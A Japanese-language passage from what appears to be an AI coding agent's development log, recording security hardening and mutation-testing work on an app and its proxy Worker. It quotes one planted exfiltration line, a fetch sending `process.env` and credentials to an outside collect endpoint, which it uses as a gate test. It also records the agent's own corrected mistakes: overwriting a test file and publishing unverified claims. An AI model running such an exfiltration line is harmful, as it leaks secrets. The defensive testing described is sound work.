が必ず消毒する**ので、区切りでのトラバーサルは今日起きない。observable だったのは**長さの側**で、`put()` の 256 字が読み出し側に無いため、「控えが壊れています」の 1 文 (パス 193 で足した) と一覧の行ラベルが**保管層の文字列を天井なしで描けた** —— パス 320 が teamradar の理由に天井を掛けたのと同じ形が、**壊れた保存値を扱う当のモジュールの中に**残っていた。`FinancialAnalysis` の id は `a.download` にしか届かない (画面の文にも実ファイル書き込みにも入らない) ので、そこは**分類の理由として測って記す** (「決めていない」ではなく「測ったら届く先が 1 つだけだった」)。直しは**新しい関門を作らない** —— 倒し込み先の 3 つの文字列 (`(名前が読めません)` / `application/octet-stream` / `unknown`) は**それ自身が同じ関門を通る** (通らない既定値は穴になる)。母集団は `downloadFilenameCensus.test.ts` (20 件) が持つ: `a.download` の 10 か所を `nameFrom` つきで両方向・**書く側が検める 3 欄と読む側が検める 3 欄が同じ**ことを両方向 (`put()` が 4 つ目を検め始めても落ちる)・既定値が自分の関門を通ること・拒む 9 形の振る舞い。法則 `center-then-count-callers` にenforcer を 1 つ足した。対照 4 方向とも鳴る: 読み側を `typeof` へ戻す ❌11 / `put()` から `isSafeMime` を外す ❌1 / 既定値を関門が拒む値にする ❌10 / 台帳から 1 行消す ❌1。★ **まだ読んでいない面 2 つは何も見つからなかった** —— `security/mnemonic.ts` (24 語復旧) は BIP-39 の 256bit 専用実装で checksum 8 bit を全ビット照合しており、`unknown word in mnemonic: "x"` が利用者の語を引用する枝は画面の前置き検査 (`looksLikeValidMnemonic`) で到達しない。`security/webauthn.ts` は `verifyBiometric` が必ず throw する fail-closed で、出荷コードからの呼び出しは 0 件。**測って何も無かったことも記録する**。**出荷物が動いたので実機も回した**: `perf` OK (LITE DCL 161 ms / heap 10.2 MB・FULL DCL 443 ms / heap 36.8 MB)・`e2e` **455 件 ❌ 0**・`e2e:lite` **455 件 ❌ 0**。★ **この作業中に 1 つ偽の premise を述べて訂正した** —— `store.list()` の `cur.value as StoredRecord<T>` を見て「`COLLECTION_SHAPES` が復元の 1 か所にしか当たっていないのは穴だ」と述べたが、`recordShapeAudit.ts` の docblock が**その非対称を設計として説明している** (store が読みで落とすと壊れた行が UI から触れなくなる —— `library.ts` の「行そのものは落とさない」パス 136 と同じ理由。入口で検め、既に入っている物は `RecordShapeAuditPanel` で点検して消す 2 段構え)。**穴ではない。** 残る本物の問いは狭く、その設計が含意する「**読み手は壊れた行に耐える**」を数える機械が無い方である)・**2026-09-20 パス 358 後の計測: 11,930,888 B / 3,343,409 B (両方 +30 B** —— 画面が写しの filter をやめて共有の関門 `planPermittedSteps` を呼ぶようにした分 (import 1 つと呼び出し 1 つ)。`shared/connectors/` は両ビルドが読むので LITE も同じだけ増える。**docblock が「defense in depth」として名指しした関門に、出荷コードからの呼び出しが 0 件だった** —— `pluginRuntime.ts` は「権限の無いコネクタは計画から**除外せず** `permitted:false` として明示し、**defense in depth は実行直前の `planPermittedSteps` で担保する**」と設計方針を述べているのに、実測するとその関数は出荷コードから 1 度も呼ばれておらず、計画の読み手は 1 つ (`ConnectorsPage` の**表示**) だけで、件数を数える所は `s.permitted` の filter を**手で書き写して**いた。**今日の実害は 0** —— プラグインのフックからコネクタを撃つ経路がどこにも無い (画面の「▶ 実行」は利用者が押す `executeFreeConnector` で、認証不要のローカル・コネクタを見本の payload で走らせる**別の道**である)。危ないのは `resolveHookPlan` が**全件を返す**ことで、実行を書く人が素直にその配列を回すと権限の無い手順も撃つ —— **関門は「呼べば効く」のではなく「呼ばなければ効かない」側**なので、呼び忘れは静かに通る。数える側を関門に通し、計画の読み手を `pluginPlanConsumers.test.ts` が**用途つきの台帳 (両方向)** で持つ (`use: 'execute'` の行には `planPermittedSteps` を通していることを要求し、今は `execute` の行が 0 件であることも別に主張する)。docblock の断定も「その『実行直前』はまだ存在しない」と実測に直した。対照 3 方向とも鳴る: 写しの filter へ戻す ❌1 / 台帳の `use` を `execute` へ ❌1 / 台帳に無い読み手を足す ❌1。**出荷物が動いたので実機も回した**: `perf` OK (LITE DCL 146 ms / heap 10.2 MB・FULL DCL 433 ms / heap 37 MB)・`e2e` **455 件 ❌ 0**・`e2e:lite` **455 件 ❌ 0**)・**2026-09-20 パス 357 後も 11,930,858 B / 3,343,379 B で byte 単位で不変** (直したのは検査 2 本の注記と `scripts/verify-survivors.cjs` の docblock・オントロジー・文書だけ。両方を組んで実測した。**パス 356 で足した道具を、宣言どおり「先に当て直す」手順で使った** —— 資格情報を使う書き込み口 3 本 (`shared/api/{cloudflare,microsoft365,security}.ts`) を測ると生存 **35 件**。`audit:survivors` に通すと **35/35 が偽**だった (既存の検査が全部殺す)。**しかも静的な値に限らなかった** —— `StringLiteral` だけでなく関数の中の `ConditionalExpression` / `LogicalOperator` / `MethodExpression` も含む。パス 356 は「モジュール直下の値の話」と書いたが、**それより広い**。**原因の特定はしていない** —— 記録するのは事実だけで、有力な見立て (vitest が同じ worker でモジュールを使い回すので `perTest` の対応付けが最初に import した検査だけに付く) は**確かめていないので断定しない**。**誤りの向きは決まっている**: 偽の生存は分子を減らすので**点数を実物より低く見せる** —— 高く見せることはない。したがって `docs/QUALITY.md` の 「100.00% / 生存 0」はこの現象では脅かされず、脅かされたのは**私の解釈**と「次にどこへ検査を書くか」の判断である。3 本は `mutate` へ**まだ入れない** —— 信用できない測定で週次 CI の門 (`thresholds.break = 99.8`) を動かさないため、台帳の `why` に実測を書いて「全掃引で確かめてから入れる」と残した。法則 `measure-before-claim` の statement に実測の合計を入れた (ad-hoc の生存 **61 件のうち 58 件が偽**・本物はパス 355 の繋ぎ目 3 件だけ)。★ **自戒: 「Tests N passed」だけを見て緑と判断した** —— その statement に書いた `` `join('')` `` の `'` が文字列リテラルを閉じて構文エラーになり、3 つの検査ファイルが**読み込みに失敗**していた (`Test Files 3 failed | 783 passed` と別の行に出ており、「Tests」の行は 0 失敗のまま・走らなかった 25 件は失敗にも数えられない)。件数が 17,777 → 17,752 に減ったことに気付いて初めて分かった。**見るのは 2 行とも**)・**2026-09-20 パス 356 後も 11,930,858 B / 3,343,379 B で byte 単位で不変** (足したのは定期点検の道具 1 本と検査 1 本・オントロジー・文書だけ。両方を組んで実測した。**★ 私がパス 353 と 355 で publish した「生存」の解釈が偽だった。** `shared/apiResponse.ts` と `shared/securityResponse.ts` を測ると生存 3 件だったので当て直したところ、**3 件とも既存の検査が殺した** (`apiResponse.test.ts` は 5 件落ちる)。同じ確認を遡って当てると、パス 353 の 13 件も (`recoverable: false` → `true` で 2 件落ちる)・パス 355 の定数 13 件も (`LOOPBACK_REDIRECT_URI` を空にして 2 件落ちる) **すべて偽の生存**だった。**本物だったのはパス 355 の `join('')` の繋ぎ目 3 件だけ** (パス 355 で足した検査だけが鳴る・実測)。原因はリポジトリが既に書いていた —— `_commentIgnoreStatic` が「覆われているものは実行され、**モジュールが変異体の有効化より前に読み込まれている**ために『生存』と報告される」と述べている。**その注記を読んでから、それでも反対の解釈を publish した** (法則 `measure-before-claim`)。つまり**モジュール直下の値の「生存」は「当てられなかった」を意味するだけ**で、検査が鳴らないことは意味しない —— 製品も検査も元から健全で、測れていなかったのは道具の側である。道具を足した: `npm run audit:survivors` (`scripts/verify-survivors.cjs`) は報告の「殺されていない」変異体を 1 つずつ**原文へ当てて** `vitest related` を走らせ、「本当に生存」と「実は殺されている」を分ける (原文へ戻すのは `finally` で、戻したことを内容で確かめる)。CI では走らせない (定期点検の道具 2 本 → **3 本**)。これで**機械の無い法則が 4 本 → 3 本**になった —— `measure-before-claim` に`harness('audit:survivors')` と検査が付いた)・**2026-09-20 パス 355 後も 11,930,858 B / 3,343,379 B で byte 単位で不変** (直したのは `stryker.config.json` と検査 1 本・文書だけ。両方を組んで実測した。パス 354 の台帳から **`oauth/callbackPaste.ts`** を 1 本消化した —— **利用者が貼り付けた OAuth の戻り値を解析する 245 行**で、同名の検査を持ちながら分母の外に在った。実測 **81.82% / 生存 16**。**解析そのものは 72 件すべて Killed** で、生存の内訳は **13 件がモジュール直下の定数**・**3 件が `[...].join('')` の繋ぎ目**で、**本物の穴は後者の 3 件だけだった** (パス 356 で訂正) —— 定数の 13 件は「変異検査が当てられなかった」側で、`LOOPBACK_REDIRECT_URI` を空にすると既存の検査が 2 件落ちる (実測)。繋ぎ目の 3 件は**パス 355 で足した検査だけが鳴る** (実測) ので、こちらは本物である。`LOOPBACK_REDIRECT_URI` は**利用者が Google Cloud Console に登録する綴り**そのもので、画面の placeholder・断りの文面・例示がすべてこの 1 つを読む —— 書き換わると「登録したはずなのに弾かれる」側に利用者が立つ。繋ぎ目は**断片ごとの `toContain` では通る**ので、`'完了できません。token の交換には'` のように**繋ぎ目を跨ぐ文字列**で留めた。読み直し (`vi.resetModules()` + 動的 import・パス 353 と同じ形) を当てて **100.00% (Killed 88 / 生存 0 / 未到達 0)** にしてから `mutate` へ足した (295 → **296**・外 118 → **117**)。パス 354 の台帳は 32 → **31** 本になった)・**2026-09-20 パス 354 後も 11,930,858 B / 3,343,379 B で byte 単位で不変** (直したのは `scripts/quality-report.cjs` と `docs/QUALITY.md` の 1 文・検査 1 本だけ。両方を組んで実測した。**公開している「100.00% / 生存 0」が、分母の範囲を述べていなかった** —— `stryker.config.json` の `mutate` は**名指しの一覧**で、`lint:mutation-scope` の docblock 自身が「上の検査は `mutate` に**載っている**ファイルしか見ない」と書いている。**外側を数える物がどこにも無かった。** 実測 (2026-09-20): `src/` の `.ts` (検査と `.d.ts` を除く) は **413 本**・`mutate` は **295 本**・**118 本が分母の外**。読んだ人は「製品ぜんぶが 100%」と受け取るが、パス 353 が見つけたとおり外には「測られるために画面から出した」判断まで居た。生成側 (`quality-report.cjs`) に範囲の 1 文を出させ、公開中の `docs/QUALITY.md` にも同じ文を入れた。さらに**外に居て判断を持っていそうな 32 本** (同名の検査が在り 100 行以上) を`mutateScopeCensus.test.ts` が両方向の台帳で持つ —— `data` (宣言の集まり) 4 本と `measure-next` (入れるべきだが今日はまだ 100% でない) 28 本で、後者には `shared/apiResponse.ts` (第三者の応答の検証)・`oauth/callbackPaste.ts` (貼り付けた callback の解析)・`shared/api/{cloudflare,microsoft365,security}.ts` (資格情報を使う書き込み口)・`shared/hydroponicsControl.ts` (1,165 行の運転管理) が居る。★ **対照は 3 方向** —— `mutate` から 1 本外す ❌1 / `QUALITY.md` の 1 文を消す ❌1 / 台帳から 1 行消す ❌1 (最初に書いた 1 つ目の対照は**既に外に居るファイル**を外そうとしていて鳴らなかった。鳴らない対照は報せなので、母集団の中の物へ当て直した)。★ もう 1 つ: 走査に `readdirSync` を使ったら `originalSourcePolicy` が捕まえた —— Stryker は台帳のファイルを書き換えてから sandbox に置くので、原文の道具 (`readOriginalDirEntries` / `readOriginalDir`) を通さないと検査が変異体を読む)・**2026-09-20 パス 353 後も 11,930,858 B / 3,343,379 B で byte 単位で不変** (直したのは `stryker.config.json` と検査 1 本・文書だけ —— **どれも出荷物に入らない**。両方を組んで実測した。**「測られるために画面から出した」判断が、一覧に足されず測られていなかった** —— `shared/storageDurability.ts` の docblock は「これは**描画ではなく判断**である。`SettingsPage` の中に `=== 'best-effort'` と書くと、`mutate` に `.tsx` が 1 件も無い構成では**一度も測られない**」と述べており、**測るために `.tsx` から出した**ものだった。ところが `stryker.config.json` の `mutate` に足されていなかった。実測: **27.78% / Killed 5 / 生存 13**。生存 13 件はすべて `EVICTION_RECOVERY` の表だった —— **この「生存」の意味を、私はパス 356 で訂正した**: モジュール直下の値の「生存」は**変異検査が当てられなかった**ことを指すだけで、検査が鳴らないことは意味しない (`recoverable: false` を `true` へ反転すると `backupCoverage.test.ts` は 2 件落ちる・実測)。つまり**製品も検査も元から健全**で、測れていなかったのは道具の側である —— その表の docblock 自身が「利用者は勧められたとおりに書き出し、**守られたつもりで**トークンを失う」「**警告を出したのに、出す前より危なくなっている**」と、その誤りを名指ししている。**主張そのものは正しかった** (ソースを直接書き換えると `backupCoverage.test.ts` は 2 件落ちる・実測) —— 見えていなかったのは**読み込みの時点**で、`stryker.config.json` の `_commentIgnoreStatic` が「覆われた static 変異体はモジュールが変異体の有効化より前に読み込まれているために生存と報告される」と既に書いていた。同じ注記が指す直し方 (`vi.resetModules()` + 動的 `await import()`) を当てて **100.00% (Killed 18 / 生存 0 / 未到達 0)** にしてから `mutate` へ足した (294 → **295**)。★ **同時に、publish 済みの 2 つを訂正した**: ① パス 351 の「関数まるごと未実行」は不正確で、実物は「1 行目の早期 return しか通っておらず中身が未実行」。② パス 350〜352 の根拠に使った変異検査の報告は **`web-shim.ts` 1 本だけの実行**で、3 行の `source` がパス 334 より前だった —— **古い報告を根拠に引いていた**。そこで 3 つの主張を報告に依らず確かめ直した: 天井・`durability`・`unreadable` の 3 つを同時に壊し、**自分の新しい検査 3 本を外して**全部を走らせると **17,711 件すべて緑** —— 3 つとも「誰も走らせていなかった」は正しかった)・**2026-09-20 パス 352 後も 11,930,858 B / 3,343,379 B で byte 単位で不変** (足したのは検査 1 本だけ。両方を組んで実測した。**「読めなかった」を「未設定」と混ぜない規則が 3 か所に在り、走っていたのは 1 か所だった** —— パス 313 が `getProxyTransport` で直した当の規則で、AI の 2 経路 (`assistant/chat` / `assistant/chatAll`) は 2026-09-20 の変異検査で **NoCoverage** だった。**効くのは、既にプロキシを登録している利用者に対してである** —— 保管先が読めないだけのときに「プロキシを構成してください」と案内すると、その人は Worker の URL と**共有シークレットを打ち直し、同じ所で失敗する**。打ち直させる値の 1 つは秘密である。`browserDirect: false` の提供者 (OpenAI) を指名して 2 経路とも実際に invoke し、保管先が**無い**ときと**読めなかった**ときで文面が分かれることを留めた (4 件)。規則を持つ 3 か所の台帳も両方向に (各所が「走らせる検査」を名指しする)。対照 2 方向とも鳴る: chat の言い分けを潰す ❌1 / chatAll を潰す ❌2)・**2026-09-20 パス 351 後も 11,930,858 B / 3,343,379 B で byte 単位で不変** (足したのは検査 1 本と `web-shim.ts` の注記 5 行だけ —— **注記は最小化で落ちる**。両方を組んで実測した。**「消えうる領域か」を名乗る関数が、1 度も実行されていなかった** —— ブラウザ版 shim の未到達 84 のうち **15** が `requestAndReadDurability` の 6 行に集まっていた (**この文は 2026-09-20 パス 353 で訂正した** —— パス 351 では「**関数まるごと**どの検査も通っていなかった」と書いたが、実際には 1 行目の早期 return には Killed 変異体が在る。jsdom には `navigator.storage` が無いので、既存の検査は関数を呼んでは**いた**が 1 行目で返っており、**中身 (2〜6 行目) が 1 度も実行されていなかった**。直しと価値は変わらないが、publish した文が実物より強かった)。この値は飾りではない: `durability` が `best-effort` のときだけ設定画面が `EvictionNotice` を出し、その文面は「**控えた 24 語では戻せません** —— 消えたときは暗号化されたトークンごと失われます」である。つまり**誤って `persistent` と答えれば、立ち退きで API キーを失う利用者がその可能性を知らないまま使い続ける**。関数の docblock が述べている主張 4 つ (要求の成否ではなく**状態**を返す / 既に永続なら `persist()` を呼ばない / API が無い環境では嘘をつかず `best-effort` へ倒す / 投げたら `best-effort`) を、9 件の振る舞いの検査で留めた。★ **対照 4 方向のうち 1 つは鳴らず、それが正しい答えだった** —— `if (st === undefined || typeof st.persisted !== 'function')` の早期 return を `false` へ倒しても 9 件とも通る。倒すと下の `try` の中で TypeError になり `catch` が**同じ `best-effort`** を返すので、外から見える答えも `persist()` の呼び出し回数も変わらない —— **等価変異**である。「鳴らない対照は合格ではなく、その検査についての報せ」なので、鳴らなかったことを理由つきの `Stryker disable next-line ConditionalExpression` として実物に書き残した (`lint:mutation-scope` が理由の無い pragma を落とす))・**2026-09-20 パス 350 後も 11,930,858 B / 3,343,379 B で byte 単位で不変** (足したのは検査 1 本だけ —— `__tests__/` は出荷物に入らない。両方を組んで実測した。**同じ天井を持つ層が 3 つ在り、走っていたのは 2 つだった** —— 変異検査の報告 (2026-09-20) を `web-shim.ts` の天井の行だけで読み直すと、**相手の応答を検める天井 4 行は Killed 15、外へ送る本文の天井 1 行だけが NoCoverage 2** だった。`countChars(text) > MAX_ANALYZE_TEXT_CHARS` に到達する検査が 1 つも無く、`>` を `>=` にしても枝ごと消しても誰も鳴らない。**天井が無いのではない** —— `aiInputCaps.test.ts` は定数を見ているが、その docblock 自身が「パス 112 の印は**名前**で当てていた」と書いており、**字面では留めてあるが振る舞いは 1 度も測っていなかった** (法則 `mention-vs-declaration` の形)。この定数を**比べている**のは 3 か所 (画面 / デスクトップ版の handler / ブラウザ版の handler) で、前 2 つは behavioural な検査が走らせていた —— **2 度書いたうち片方しか測っていない**形で、handler の天井は「画面を通らずに来た要求」のために在るのだから、測られていなかったのは**画面の天井が破られたときのための層**である。振る舞いの検査 6 件 (境界ちょうど / +1 で断る / 断るときは送らず**鍵も読まない** / 絵文字 5,000 個 = コード単位 10,000 は通る / 絵文字 +1 で断る / 空と非文字列) と、3 層の台帳 (両方向・各層が「走らせる検査」を名指しし、その検査の実在と定数の参照まで見る) を足した。対照 4 方向とも鳴る: `>` → `>=` ❌2 / `countChars` → `.length` ❌1 / 枝ごと削除 ❌2 / main の層を外す ❌1)・**2026-09-20 パス 349 後も 11,930,858 B / 3,343,379 B で byte 単位で不変** (直したのは `docs/PROXY_EXAMPLE.md` (利用者が自分の Cloudflare へ貼る Worker) とパリティ検査 1 本・`scripts/integrity-chain.cjs`・文書だけ —— **どれも出荷物に入らない**。両方を組んで実測した。**「9 本のうち機械が走らせているのは N 本」という数を、誰も機械で持っていなかった** —— パス 345 で 2 本、パス 347 で 5 本と**パスごとに人が数え直して散文に書いて**おり、しかも数え直しは「今の本数」しか言わないので **10 本目が生えても何も鳴らない**。母集団 (md の js ブロックが宣言する関数) を走査で数え、1 本ずつ `run` / `read` と理由を持つ台帳と**両方向**に突き合わせる形にした。残っていた 3 本も走らせ、**既定エクスポートの `fetch` ハンドラ以外の 8 本すべてが `run`** に —— `isRedirect` はアプリの `REDIRECT_STATUSES` と 100〜599 の全域で一致、`timingSafeEqualStr` は `constantTimeEquals` と 8 標本 (孤立サロゲートを含む) で一致、`json` は断りの応答の `Content-Type` と `Access-Control-Allow-Origin` を 1 か所で決めていた。**§3 の前提が 1 つ偽だった** —— 「allowlist を空にしたり `*` 相当に緩めた時点で誰でも使えるオープンプロキシになる」と書いていたが、実物は `SHARED_SECRET = ''` が既定で `if (SHARED_SECRET)` を通らず、応答は常に `Access-Control-Allow-Origin: *` なので、**緩めなくても既定のまま許可リストの 10 ホストに対して誰でも呼べる**。allowlist が決めるのは**どこへ**で、**誰が**を決めるのは `SHARED_SECRET` である —— 取り違えたまま読むと「allowlist さえ絞れば認証は要らない」と判断することになる (パス 337 と同じ premise の偽)。さらに **`docs/PROXY_EXAMPLE.md` を整合性チェーンへ** (保護対象 82 → **83**・block **#245**) —— アプリ側の双子 `renderer/network/proxy.ts` はパス 345 から保護対象なのに、**実際に要求を投げる側**が外に居た (パリティ検査の docblock 自身が「実際に要求を投げるのは Worker のほう」と書いている)。`release.yml` / `pages.yml` を足したときと同じ「守る順番の逆転」である)・**2026-09-20 パス 348 後も 11,930,858 B / 3,343,379 B で byte 単位で不変** (直したのは `src/shared/ontology/laws.ts` と `src/shared/templateSvg.ts` の注記・新しい検査 1 本・文書だけ —— **オントロジーも注記も `__tests__/` も出荷物に入らない**。両方を組んで実測した。**法則が名指しする 3 形式のうち、機械が数えていたのは 1 つだけだった** —— `exported-markup-escapes-free-text` は「書き出した `.md` / `.svg` / `.html` は**ダウンロードして人に渡る**」と述べ、`enforcedBy` に 3 つを挙げているのに、その中身は **Markdown の母集団 1 つ** (`markdownExportCensus`・パス 332)、**エスケープ関数そのものの検査** (誰が通すかは見ない)、そして**法則自身が「落とすのは再実装であって『通していない』ではない」と書いている** `lint:forbidden` だった。**覆われていなかったのは危ない方である** —— Markdown は不活性だが、`.svg` はブラウザで開くと中の `<script>` が**走り**、`.svg` と `.html` は `SHELL_OPEN_EXTS` に載っているので**アプリ自身が `shell.openPath` で OS の既定アプリに開かせる**。紙に載るのは利用者の入力だけでなく AI の応答と第三者 API の応答でもある。**実測すると穴は 1 つも無かった** (5 本 = `templateSvg` / `teamRadarSvg` / main の stocks・business / ブラウザ版の stocksAnalysisWeb・補間 375 のうち自由文 100 か所はすべて `escapeXml` を通り、色は入口で `isHexColor` (断る) か `safeColor` (既定値へ落とす))。欠けていたのは**それを保つ物**である (パス 344 と同じ形)。`markupExportCensus.test.ts` が母集団と、**エスケープを通らずに紙へ出る根 94 件**をファイルごとに両方向で持つ (対照 3 方向 + 実物を壊す外部対照 2 方向)。★ **最初に書いた針は母集団の一部を見ていなかった** —— バッククォートを素朴に対にしたため、`<section>${xs.map((r) => `<article>…)}` の**入れ子で外側が切れ**、内側の markup が 1 度も見られなかった (main の stocks は補間 43 → **59**・エスケープ 18 → **25**)。そのまま「全部通っている」と publish する所だった (パス 334 と同じ家系)。注記を潰してから読み、文字列は行を跨がないものとして扱う (docblock のバッククォートと正規表現 `/[",\r\n]/` の引用符でも走査が壊れた)。ついでに 2 つの散文を実測で直した: 法則の「色は `safeColor` で検証して既定値へ落とす」と `templateSvg.ts` の「どちらの道も色は `safeColor` を通る」は、**実際には `safeColor` の呼び出しは緩い側の 2 か所だけ**で、main は `isHexColor` で throw していた (守りの強さは同じだが、読んだ人は `safeColor` を消せば両方が鳴ると思うことになる))・**2026-09-20 パス 347 後も 11,930,858 B / 3,343,379 B で byte 単位で不変** (直したのは `scripts/` の 2 ゲートと検査 2 本・文書だけ。両方を組んで実測した。**出荷物の中身を決める `vite.config.ts` が、どのゲートにも鎖にも入っていなかった** —— `lint:forbidden` の `SCAN_ROOTS` は**ディレクトリの一覧**なので、リポジトリ直下のファイルはどの根にも入らない。対照 (実測): `vite.config.ts` へ任意コード実行を植えると `lint:forbidden` / `lint:imports` / `lint:network-targets` / `chain:verify` が**すべて exit 0**。**梱包設定 `electron-builder.json` は 2026-08 から鎖の保護対象なのに、束ねる側の設定は走査も封緘もされていなかった。** `SCAN_FILES` (直下の 3 本) を足して走査 609 → **612** にし、名指しの `MUST_SCAN` にも載せ、3 本とも鎖へ入れた (保護対象 79 → **82**・block **#244**)。内訳の印字にも `(直下) 3` を並べた (合計と内訳が合わない印字にしない)。**3 本とも鎖の基準どおりの安定資産**である (実測: 全履歴で 2 / 2 / 1 コミット)。★ 直したあと `verify:all` が**私の書いた docblock**を捕まえた —— 説明文に禁止の綴りをそのまま書いたため (`eval(` は注記の中でも鳴る)。言い換えた。**根を `'.'` にはしない** —— 木全体 (`knowledge-vault/` 7,000 本ほか) を歩くことになるので、単体の名前で数える (増えたときに気付ける側でもある)。**この日の他の 3 つの探りは何も見つからなかった**: Worker の `denyReason` 以外の関数・Electron の危ない `webPreferences` 6 種 (**6 種とも `lint:forbidden` が鳴る**・`nodeIntegrationInWorker` / `…InSubFrames` は `nodeIntegration` の式が既に拾うとdocblock が明記していた)・モデル応答の描画 (`InlineToken` は `{text,bold?,code?}` だけで**リンクも画像も型として存在しない**)。**測って何も無かったことも記録する**)・**2026-09-20 パス 346 後も 11,930,858 B / 3,343,379 B で byte 単位で不変** (直したのは `scripts/e2e/core.cjs` と検査 1 本・文書だけ —— `scripts/` も `__tests__/` も出荷物に入らない。両方を組んで実測した。**e2e の床が 2 か所に手書きで、実物と 3 つの文がずれていた** —— 32 suite を回して突き合わせると、`paperAccount` の注記 10 に対し実物は **13** で、**その床 8 は実測の 62%** (意図は 85%・5 件減っても鳴らない)。`theme` の床 10 も 71%。`MIN_TOTAL_CHECKS` 384 は注記合計 452 の 85.0% で**数そのものは正しかった**が、それを説明する文は core.cjs で「実測 (合計 395 件) の 85%」・CLAUDE.md で「床 377 → 381 = 実測 449 の 85%」と**どちらも偽**だった。**数は保たれていたのに、その数が何の 85% なのかを述べた文だけが古びていた。** 表の列を実測値 1 つにして床は `floorOf()` が導く形にし (32 + 1 = 33 の手書きの数が 0 に)、実測値が実物とずれたら runner が走り終えたあとに**注意書きとして印字する** (落とさない)。実機: `e2e` 455 件 ❌ 0・`e2e:lite` 455 件 ❌ 0 (新しい床 386 と paperAccount 11 / theme 11 で通る)。★ **この作業中に私は既存の検査ファイルを `cat >` で上書きして 8 件の検査を消した** —— `verify:arch` の「ユニットテスト数」が**増えるはずの所で 1 減った**ことで気付き、HEAD から戻して併合した (`src/` へ書く前に在るかを見ていなかった。パス 341 の `git checkout --` と同じ家系))・**2026-09-20 パス 345 後の計測: 11,930,858 B / 3,343,379 B (両方 +135 B** —— `fetchViaProxy` に「平文 http の公開ホストは断る」枝を 1 つ足した分 (文は日本語 1 文)。**配る Worker が平文 http の上流を通していた** —— md から `denyReason` を切り出して走らせる実測で `http://api.notion.com/v1/x` が **`null` (通す)** を返した。さらに資格情報を落とす条件が `next.host !== target.host` で、**`https://api.notion.com` → `http://api.notion.com` の転送では host が等しく `Authorization` を持ち越していた** —— 許可リスト内の上流が `302 Location: http://` を 1 つ返すだけで、利用者の Bearer が平文で流れる形である。**正当な用途は測って 0 件** (`fetchViaProxy` の呼び出し口 3 つはどれも `shared/api/*.ts` の https リテラルを渡し、LAN / loopback は `isPrivateOrReservedTarget` が別に拒む)。両側で https を要求し、持ち越しの判定を **origin** へ移し、`proxyWorkerParity.test.ts` が同じ標本を両方へ当てて結んだ (対照 3 方向)。判定の順序は**具体的な理由が先** —— `http://127.0.0.1:8080/admin` には SSRF、`http://evil.example` には「リストに無い」と答える。`renderer/network/proxy.ts` は**整合性チェーンの保護対象**なので `chain:append` で block **#243** を採掘した。実機: `perf` OK (LITE DCL 160 ms / FULL 440 ms)・`e2e` 455 件 ❌ 0・`e2e:lite` 455 件 ❌ 0)・**2026-09-20 パス 344 後も 11,930,723 B / 3,343,244 B で byte 単位で不変** (直したのは検査 1 本と文書だけ。両方を組んで実測した。**パス 343 で足した法則 `distributed-code-same-gates` の母集団を測ったら、まだ 4 本外に居た** —— CSP を書く builder は実測 **8 本**で、`lint:artifact-csp` が CI で当たるのは `pages.yml` が publish する 4 本だけ。残り 4 本 (経営書類スタジオ / 業務自動化ダッシュボード / 就業規則メーカー / 電子定款メーカー) は**利用者がダウンロードして開く単一ファイル**で、CI では 1 度も組まれず**どのゲートにも触られていなかった** (就業規則メーカーと電子定款メーカーは tests=0 / gates=0 / workflows=0)。**今日は 4 本とも `document` プロファイルを通る** (実測 exit 0) —— 欠けていたのは**それを保つ物**のほうである。母集団と 8 本それぞれの合否を `artifactCspCensus.test.ts` が**門の `evaluate` を借りて**両方向に留めた (対照 2 方向: CSP を緩める / 台帳に無い builder を足す)。注入口 (`innerHTML` ほか) は `lint:forbidden` が `scripts/` を含めて 0 件で留めているので数えない (実測でも 4 本の出力は `textContent` / `createElement` だけ))・**2026-09-20 パス 343 後も 11,930,723 B / 3,343,244 B で byte 単位で不変** (直したのは `docs/PROXY_EXAMPLE.md` (利用者が自分の Cloudflare へ貼る Worker) と検査 1 本・`src/shared/ontology/laws.ts`・文書だけ。両方を組んで実測した。**配る Worker が上流の本文を無制限に読んでいた** —— `await upstream.text()` が素で置かれており、実測 (Node 22) で **64 MiB の応答が rss +223 MiB / 2,034 ms**・**256 MiB で rss +956 MiB / 6,787 ms**。**Workers の isolate は 128 MiB** なので 64 MiB の応答 1 つで Worker ごと落ちる。アプリ側の `MAX_PROXY_RESPONSE_BYTES` は**この Worker が返した封筒**に掛かるので、Worker が先に落ちる限り一度も効かない (パス 330 の「読む所で切る」がそのまま当てはまる)。**同じ Worker はホップ数には上限を持ち、その理由に「無制限に追うと CPU time と subrequest 枠を使い切る」と書いてある** —— 資源の枯渇を 1 つの軸でだけ見ていた。`readCappedText` (1 チャンクずつ数えて超えたら `cancel`) を足し、`MAX_UPSTREAM_BYTES` とアプリ側の `MAX_HTTP_RESPONSE_BYTES` を**パリティ検査で結んだ** (md から関数を切り出して実際に走らせる。対照 2 方向つき)。見出しの「約 290 行」が実測 325 行とずれていたのも機械に留めた。法則 89 本目 `distributed-code-same-gates`)・**2026-09-20 パス 342 後も 11,930,723 B / 3,343,244 B で byte 単位で不変** (直したのは `scripts/` の 2 ゲートと検査 1 本・`src/shared/ontology/laws.ts`・文書だけ —— **オントロジーも `scripts/` も `__tests__/` も出荷物に入らない**。両方を組んで実測した。見つけたのは **37 ゲート全部が素通りする経路**で、`lint:network-targets` は `src/` の `.ts`/`.tsx` しか読まず、`scripts/` に `fetch(\`https://${host}/v1/collect\`, { headers: { Authorization }, body: JSON.stringify({ env: process.env }) })` を植えても **exit 0** だった (同じコードを `src/` へ置くと鳴る —— **差は検出器ではなく走査範囲だけ**)。`scripts/` は CI で走り、`release.yml` の梱包ステップは署名鍵 4 本と `GH_TOKEN` を env に持つ。**直し方は「`ROOTS` を広げる」ではなかった** —— 木全体へ広げると 20 件出るが**真陽性は 0 件** (全部ゲート自身の self-test の標本) で、`src` の外に実在する網の口 3 件は**どれも送り先が素の識別子**なので `BARE_SEND` が**意図して**見ない。つまり広げても 1 件も見えない。第 3 の母集団として**別の検出器 + 全件台帳 (両方向・床つき)** を足した。この門は法則 `scan-whole-tree` の執行者なのに**自分がその法則を破っていた**)・**2026-09-20 パス 337 後も 11,930,723 B / 3,343,244 B で byte 単位で不変** (直したのは `scripts/` の説明文と新しい定期点検の道具・`src/shared/ontology/laws.ts`・検査 1 本だけ —— **オントロジーは出荷物に入らない** (読むのは検査と生成 script だけなので tree-shaking で丸ごと落ちる) し、`scripts/` と `__tests__/` も入らない。**両方を組んで実測した**。見つけたのは「門が意図して外した物の**理由**が実測と食い違っていたこと」 —— 結論は正しいが premise が偽で、次に式を足す人はその偽の premise から判断することになる)・**2026-09-20 パス 336 後の計測: 11,930,723 B / 3,343,244 B (両方 +18 B** —— **「分かる人が決めること」と書いたまま 1 か月近く残っていた 2 つの判断を、実測して決めた分**。増分が 18 B しか無いのは、どちらも**数字を 1 